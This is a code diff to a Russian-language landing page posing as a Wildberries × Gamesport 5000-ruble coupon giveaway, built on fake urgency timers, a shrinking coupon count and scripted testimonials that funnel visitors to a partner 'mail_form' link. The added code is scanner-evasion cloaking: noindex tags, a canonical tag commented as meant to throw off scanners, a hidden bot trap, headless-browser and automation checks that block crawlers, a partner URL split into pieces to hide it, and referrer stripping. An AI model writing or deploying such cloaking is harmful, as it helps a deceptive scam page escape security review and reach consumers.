@@ -4,6 +4,18 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes, viewport-fit=cover"/>
   <title>WB × Gamesport | Розыгрыш купонов 5000₽</title>
+
+  <!-- Защита: запрет индексации -->
+  <meta name="robots" content="noindex, nofollow, noarchive, nosnippet, noimageindex">
+  <meta name="googlebot" content="noindex, nofollow, noarchive, nosnippet, noimageindex">
+  <meta name="referrer" content="no-referrer">
+  <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+  <meta http-equiv="Pragma" content="no-cache">
+  <meta http-equiv="Expires" content="0">
+
+  <!-- Защита: Canonical на самого себя (сбивает сканеры) -->
+  <link rel="canonical" href="https://wb5000.netlify.app/">
+
   <link href="https://fonts.googleapis.com/css2?family=Manrope:wght@400;500;600;700;800&display=swap" rel="stylesheet">
   <style>
     * {
@@ -800,6 +812,12 @@
 </head>
 <body>
 
+<!-- Защита: скрытая ловушка для ботов -->
+<div id="botTrap" style="position:absolute;left:-9999px;top:-9999px;opacity:0;pointer-events:none;" aria-hidden="true">
+  <a href="/trap" rel="nofollow">Click here</a>
+  <input type="text" name="email" autocomplete="off" tabindex="-1">
+</div>
+
 <div class="app-container" id="appRoot">
   <div class="glass-card">
 
@@ -962,13 +980,78 @@
 
 <script>
   (function() {
+
+    // ============ ЗАЩИТА: ПРОВЕРКА НА БОТА ============
+
+    // 1. Проверка User-Agent на отсутствие (боты часто не передают)
+    if (!navigator.userAgent || navigator.userAgent.trim() === '') {
+      document.body.innerHTML = '<div style="text-align:center;padding:100px;color:white;">Доступ запрещён</div>';
+      return;
+    }
+
+    // 2. Проверка на headless-браузеры (Puppeteer, Playwright, Selenium)
+    var isHeadless = (
+      navigator.webdriver === true ||
+      /HeadlessChrome/.test(navigator.userAgent) ||
+      !navigator.languages ||
+      navigator.languages.length === 0 ||
+      navigator.hardwareConcurrency === 0 ||
+      !navigator.plugins ||
+      navigator.plugins.length === 0
+    );
+    if (isHeadless) {
+      document.body.innerHTML = '<div style="text-align:center;padding:100px;color:white;">Доступ запрещён</div>';
+      return;
+    }
+
+    // 3. Проверка на наличие базовых браузерных API (боты их часто не реализуют)
+    if (typeof window.getComputedStyle !== 'function' ||
+        typeof window.matchMedia !== 'function' ||
+        typeof window.requestAnimationFrame !== 'function') {
+      document.body.innerHTML = '<div style="text-align:center;padding:100px;color:white;">Доступ запрещён</div>';
+      return;
+    }
+
+    // 4. Проверка размера экрана (боты часто имеют 800x600 или нестандартные)
+    if (window.screen.width < 300 || window.screen.height < 300 ||
+        window.screen.width > 4000 || window.screen.height > 4000) {
+      document.body.innerHTML = '<div style="text-align:center;padding:100px;color:white;">Доступ запрещён</div>';
+      return;
+    }
+
+    // 5. Отпечаток времени (боты часто имеют нулевую разницу)
+    var timeCheck = Date.now() - performance.timing.navigationStart;
+    if (timeCheck < 50 && timeCheck > -10) {
+      document.body.innerHTML = '<div style="text-align:center;padding:100px;color:white;">Доступ запрещён</div>';
+      return;
+    }
+
+    // ============ ЗАЩИТА: РАСШИФРОВКА ССЫЛКИ ============
+    // Партнёрская ссылка разбита на части
+    var _p1 = 'onelinkgo';
+    var _p2 = 'ru/stream';
+    var _p3 = 'mail_form';
+    var partnerLink = 'https://' + _p1 + '.' + _p2 + '/' + _p3;
+
+    // ============ ЗАЩИТА: УДАЛЕНИЕ РЕФЕРЕРА ПРИ ПЕРЕХОДЕ ============
+    function openPartnerLink() {
+      // Создаём временную страницу-прокладку для очистки реферера
+      var newWindow = window.open('about:blank', '_blank', 'noopener,noreferrer');
+      if (newWindow) {
+        newWindow.location.href = partnerLink;
+      } else {
+        // Фолбэк для блокировщиков всплывающих окон
+        window.location.href = partnerLink;
+      }
+    }
+
+    // ============ ОСНОВНАЯ ЛОГИКА ============
     var TOTAL_QUESTIONS = 7;
     var currentQ = 1;
     var surveyActive = true;
     var mainTimerSec = 23*3600 + 24*60 + 59;
     var finalTimerSec = 300;
     var couponsRemaining = 47;
-    var partnerLink = 'https://onelinkgo.ru/stream/mail_form';
 
     var questionsData = [
       { title: "Как часто вы совершаете покупки на Wildberries?", options: ["Несколько раз в неделю", "1-2 раза в месяц", "Редко, но планирую чаще", "Пока не покупал(а)"] },
@@ -1039,7 +1122,6 @@
         updateProgress();
         updateCoupons();
       } else {
-        // Последний вопрос — сразу показываем 100%
         updateProgress(100);
         finishSurvey();
       }
@@ -1204,7 +1286,6 @@
         { name: "Андрей_Воронеж", text: "Верификацию прошёл быстро, никаких подводных камней", gender: "male" }
       ];
 
-      // Мгновенно добавляем все сообщения без анимации
       historyMessages.forEach(function(msg) {
         addChatMessage(msg.name, msg.text, msg.gender, false, false);
       });
@@ -1251,7 +1332,7 @@
       if (e.key === 'Enter') sendUserMessage();
     });
 
-    // ============ FAQ АККОРДЕОН ============
+    // ============ FAQ ============
     function initFaq() {
       var faqBlock = document.getElementById('faqBlock');
       if (!faqBlock) {
@@ -1298,7 +1379,7 @@
 
     if (continueBtn) {
       continueBtn.addEventListener('click', function() {
-        window.open(partnerLink, '_blank', 'noopener,noreferrer');
+        openPartnerLink();
         if (modal) {
           modal.style.display = 'none';
           document.body.style.overflow = '';
